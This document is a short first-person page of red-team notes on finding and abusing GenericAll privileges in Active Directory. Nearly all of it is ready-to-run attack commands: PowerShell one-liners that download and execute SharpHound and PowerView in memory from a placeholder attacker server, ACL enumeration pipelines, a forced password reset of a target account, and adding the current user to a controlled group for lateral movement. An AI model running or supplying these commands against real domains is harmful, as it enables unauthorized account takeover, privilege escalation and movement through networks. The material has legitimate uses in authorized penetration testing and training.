# <h1 align="center" id="heading">GenericAll</h1>
There are a few ways that I can check for GenericAll privileges within an Active Directory environment. The first and easiest is through BloodHound. I can collect BloodHound graphing information for the target domain in a few ways. The easiest and most accurate way is through SharpHound collection. I prefer to run the collection in memory with the following command:
```powershell
IEX(new-Object System.Net.WebClient).DownloadString("http://<attacker_server>/SharpHound.ps1");Invoke-BloodHound -CollectionMethod All
```
If I have valid domain credentials, I can use the Python collector BloodHound.py. This can be run from any platform that has Python support so I do not need to rely solely on Windows. This comes in handy when I find myself on a Domain-joined linux system. I can use the following command to execute the BloodHound graphing information collection:
```console
bloodhound-python -u <username> -p '<password>' -ns <target ip> -d <domain name> -c all
```
This may or may not work depending on the target system! I can also use the following PowerView command to enumerate the presence of GenericAll much faster:
```powershell
IEX(new-Object System.Net.WebClient).DownloadString("http://<attacker_server>/PowerView.ps1");Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```
If I find that I have GenricAll privileges I can check that I have control over the object by  changing the account password with the following command:
```powershell
net user <target user> Password123! /domain
```
I can also check to see if my current user has explicit access rights to any groups with the following command:
```powershell
IEX(new-Object System.Net.WebClient).DownloadString("http://<attacker_server>/PowerView.ps1");Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```
If I find any groups that I have explicit control over, I can usee the following command to add my current user to that group:
```powershell
net group <target group> <domain user> /add /domain
```
Once I become a member of that group, I will inherit all of the group privileges which may or may not allow for lateral movement within the target domain.
